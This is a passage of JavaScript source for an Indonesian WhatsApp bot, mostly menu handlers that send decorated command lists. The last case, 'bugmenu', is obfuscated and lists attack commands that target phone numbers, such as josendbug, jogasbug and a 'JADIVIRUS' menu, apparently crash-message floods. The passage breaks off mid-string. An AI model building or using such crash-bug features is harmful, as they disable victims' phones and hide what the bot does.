╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘PHOTO OXY MENU〙
│➳ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
│➳ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
│➳ ${prefix}𝚜𝚖𝚘𝚔𝚎
│➳ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
│➳ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
│➳ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
│➳ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
│➳ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
│➳ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
│➳ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'ephotomenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 EPHOTO MENU 〙
│➳ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
│➳ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
│➳ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
│➳ ${prefix}𝚐𝚕𝚊𝚜𝚜
│➳ ${prefix}𝚗𝚎𝚘𝚗
│➳ ${prefix}𝚋𝚎𝚊𝚌𝚑
│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
│➳ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
│➳ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'funmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 FUN MENU 〙
│➳ ${prefix}𝚜𝚒𝚖𝚒𝚑
│➳ ${prefix}𝚑𝚊𝚕𝚊𝚑
│➳ ${prefix}𝚑𝚒𝚕𝚒𝚑
│➳ ${prefix}𝚑𝚞𝚕𝚞𝚑
│➳ ${prefix}𝚑𝚎𝚕𝚎𝚑
│➳ ${prefix}𝚑𝚘𝚕𝚘𝚑
│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
│➳ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
│➳ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
│➳ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
│➳ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
│➳ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
│➳ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'primbonmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 PRIMBON MENU 〙
│➳ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
│➳ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
│➳ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
│➳ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
│➳ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
│➳ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
│➳ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
│➳ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
│➳ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
│➳ ${prefix}𝚗𝚊𝚜𝚒𝚋
│➳ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
│➳ ${prefix}𝚝𝚊𝚛𝚘𝚝
│➳ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
│➳ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
│➳ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
│➳ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚠𝚎𝚝𝚘𝚗
│➳ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
│➳ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
│➳ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
│➳ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
│➳ ${prefix}𝚜𝚑𝚒𝚘
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'convertmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 CONVERT MENU 〙
│➳ ${prefix}𝚊𝚝𝚝𝚙
│➳ ${prefix}𝚝𝚝𝚙
│➳ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
│➳ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
│➳ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
│➳ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
│➳ ${prefix}𝚝𝚘𝚐𝚒𝚏
│➳ ${prefix}𝚝𝚘𝚞𝚛𝚕
│➳ ${prefix}𝚝𝚘𝚟𝚗
│➳ ${prefix}𝚝𝚘𝚖𝚙3
│➳ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
│➳ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
│➳ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
│➳ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
│➳ ${prefix}𝚜𝚖𝚎𝚖𝚎
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'mainmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 MAIN MENU 〙
│➳ ${prefix}𝚙𝚒𝚗𝚐
│➳ ${prefix}𝚘𝚠𝚗𝚎𝚛
│➳ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
│➳ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
│➳ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
│➳ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'databasemenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 DATABASE MENU 〙
│➳ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
│➳ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
│➳ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
│➳ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
│➳ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
│➳ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'anonymousmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘ANONYMOUS MENU〙
│➳ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
│➳ ${prefix}𝚜𝚝𝚊𝚛𝚝
│➳ ${prefix}𝚗𝚎𝚡𝚝
│➳ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'islamicmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 ISLAMIC MENU 〙
│➳ ${prefix}𝚒𝚚𝚛𝚊
│➳ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
│➳ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
│➳ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
│➳ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'voicemenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 VOICE MENU 〙
│➳ ${prefix}𝚋𝚊𝚜𝚜
│➳ ${prefix}𝚋𝚕𝚘𝚠𝚗
│➳ ${prefix}𝚍𝚎𝚎𝚙
│➳ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
│➳ ${prefix}𝚏𝚊𝚜𝚝
│➳ ${prefix}𝚏𝚊𝚝
│➳ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
│➳ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
│➳ ${prefix}𝚛𝚘𝚋𝚘𝚝
│➳ ${prefix}𝚜𝚕𝚘𝚠
│➳ ${prefix}𝚝𝚞𝚙𝚊𝚒
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'ownermenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 OWNER MENU 〙
│➳ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
│➳ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
│➳ ${prefix}𝚕𝚎𝚊𝚟𝚎
│➳ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
│➳ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
│➳ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'bugmenu': { 
function _0x2db8(){var _0x30036a=['josendbug6\x20(Nomer)\x20\x0a│➳\x20','joinfiniteto\x20(Nomer)\x20\x0a│➳\x20','jadibugdoc\x20(Reply\x20Media)\x20\x0a│➳\x20','jadidarkness\x20(Reply\x20Media)\x20\x0a│➳\x20','jogasbug12\x20(Nomer)\x20\x0a│➳\x20','josendbug11\x20(Nomer)\x20\x0a│➳\x20','josendbug8\x20(Nomer)\x20\x0a│➳\x20','josendbug3\x20(Nomer)\x20\x0a│➳\x20','console','jothelima\x20(jumlah)\x0a│➳\x20','jolokas\x20(jumlah)\x0a│➳\x20','jogasbug8\x20(Nomer)\x20\x0a│➳\x20','jobutto\x20(Nomer)\x20\x0a│➳\x20','jadikintil\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','johelloto\x20(Nomer)\x0a│➳\x20','jobug9\x20(jumlah)\x0a│➳\x20','jobugstik\x20(jumlah)\x0a│➳\x20','jogasliveloc\x20(Nomer)\x0a│➳\x20','jotengkorak\x20(jumlah)\x0a│➳\x20','jobug1\x20(jumlah)\x0a│➳\x20','jadibugbutton\x20(Teks)\x20\x0a│➳\x20','4825818uRJFHE','sendMessage','jobugdocto\x20(Nomer)\x0a│➳\x20','39075bSlHRh','jobugvn\x20(jumlah)\x0a│➳\x20','kontolto\x20(Nomer)\x0a│➳\x20','jaditroli\x20(Teks)\x20\x0a│➳\x20','jadiliveloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jobuglist\x20(jumlah)\x0a│➳\x20','josantet\x0a│➳\x20','__proto__','toString','jobuttonbro\x20(jumlah)\x0a│➳\x20','jadilokas\x20(Teks)\x20\x0a│➳\x20','jobug3\x20(jumlah)\x0a│➳\x20','jobuginvite\x20(jumlah)\x0a│➳\x20','info','jogasinfinite\x20(Nomer)\x20\x0a│➳\x20','jobugstikv2\x20(jumlah)\x0a│➳\x20','jogaspay\x20(Nomer)\x20\x0a│➳\x20','18Zhizdn','josendbug12\x20(Nomer)\x20\x0a│➳\x20','jadikuntul\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jostikto\x20(Nomer)\x20\x0a│➳\x20','joinfinite\x0a│➳\x20','warn','Runtime\x20','apply','jopay\x20(jumlah)\x0a│➳\x20','jobug8\x20(jumlah)\x0a│➳\x20','jogasbug5\x20(Nomer)\x20\x0a│➳\x20','PHOTO','jolivelocv2\x20(jumlah)\x0a│➳\x20','josendbug1\x20(Nomer)\x20\x0a│➳\x20','jogastengkorak\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20JADIVIRUS\x20MENU\x20〙\x0a│➳\x20','jogasvn\x20(Nomer)\x20\x0a│➳\x20','joslebew\x0a│➳\x20','monyet\x20(jumlah)\x0a│➳\x20','jopayto\x20(Nomer)\x20\x0a│➳\x20','jolivelocto\x20(Nomer)\x0a│➳\x20','jobug6\x20(jumlah)\x0a│➳\x20','kintilto\x20(Nomer)\x0a│➳\x20','jadipeler\x20(Teks)\x20\x0a│➳\x20','kontol\x20(jumlah)\x0a│➳\x20','jovnto\x20(Nomer)\x20\x0a│➳\x20','exception','jogasbug4\x20(Nomer)\x20\x0a│➳\x20','josendbug2\x20(Nomer)\x20\x0a│➳\x20','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','228674mbpTqU','jobug7\x20(jumlah)\x0a│➳\x20','jadibugloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','720714oYXjVg','jobug5\x20(jumlah)\x0a│➳\x20